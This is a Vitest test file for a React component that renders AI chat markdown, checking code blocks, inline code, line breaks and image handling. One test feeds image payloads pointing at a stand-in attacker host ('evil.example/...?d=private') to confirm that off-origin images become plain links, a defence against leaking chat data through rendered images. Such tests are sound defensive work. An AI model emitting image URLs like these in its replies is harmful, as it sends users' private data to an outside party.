import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, test } from "vitest";

import { AiChatMarkdown } from "./ai-chat-markdown.tsx";

describe("AiChatMarkdown", () => {
	afterEach(() => {
		cleanup();
	});

	test("renders code blocks with app-owned classes", () => {
		const { container } = render(<AiChatMarkdown markdown={"```bash\nls -r\n```"} />);

		const block = container.querySelector(".AiChatMarkdown-code-block");
		const language = container.querySelector(".AiChatMarkdown-code-header-language");
		const code = container.querySelector(".AiChatMarkdown-code");
		const copyButton = container.querySelector("button.AiChatMarkdown-code-copy-button");

		expect(block).not.toBeNull();
		expect(language?.textContent).toBe("bash");
		expect(code?.textContent).toBe("ls -r");
		expect(copyButton?.getAttribute("aria-label")).toBe("Copy code");
		expect(container.querySelector("[data-streamdown='code-block']")).toBeNull();
	});

	test("renders inline code with app-owned classes", () => {
		const { container } = render(<AiChatMarkdown markdown={"Use `search` for indexed content lookup."} />);

		const inlineCode = container.querySelector(".AiChatMarkdown-inline-code");

		expect(inlineCode?.textContent).toBe("search");
		expect(container.querySelector("[data-streamdown='inline-code']")).toBeNull();
	});

	test("passes content classes to the Streamdown wrapper", () => {
		const { container } = render(<AiChatMarkdown markdown={"Line 1\nLine 2"} contentClassName="TestMarkdownContent" />);

		const content = container.querySelector(".AiChatMarkdown-content.TestMarkdownContent");

		expect(content?.textContent).toBe("Line 1\nLine 2");
	});

	test("renders soft line breaks in paragraphs as br elements", () => {
		const { container } = render(<AiChatMarkdown markdown={"001 first\n002 second\n003 third"} />);

		const paragraph = container.querySelector("p");

		expect(paragraph?.querySelectorAll("br")).toHaveLength(2);
	});

	test("renders images from other origins as links, not img elements", () => {
		const { container } = render(
			<AiChatMarkdown
				markdown={[
					"![secret](https://evil.example/a.png?d=private)",
					"[![badge](https://evil.example/b.svg?d=private)](https://github.com)",
					'<picture><source srcset="https://evil.example/c.png?d=private"><img src="/logo.png"></picture>',
				].join("\n\n")}
			/>,
		);

		const links = [...container.querySelectorAll("[data-streamdown='link']")].map((link) => link.textContent);

		expect([...container.querySelectorAll("img")].map((image) => image.getAttribute("src"))).toEqual(["/logo.png"]);
		expect(container.querySelector("source")).toBeNull();
		expect(container.innerHTML).not.toContain("evil.example/b.svg");
		// Keep the blocked image readable as a link, and keep a badge image inside a link as plain text.
		expect(links).toEqual(["secret", "badge"]);
	});

	test("renders Press media images", () => {
		const src = `https://${import.meta.env.VITE_R2_FILES_DOWNLOAD_HOST}/organizations/o1/image.png?X-Amz-Signature=abc`;

		const { container } = render(<AiChatMarkdown markdown={`![chart](${src})`} />);

		expect(container.querySelector("img")?.getAttribute("src")).toBe(src);
		expect(container.querySelector("[data-streamdown='link']")).toBeNull();
	});
});
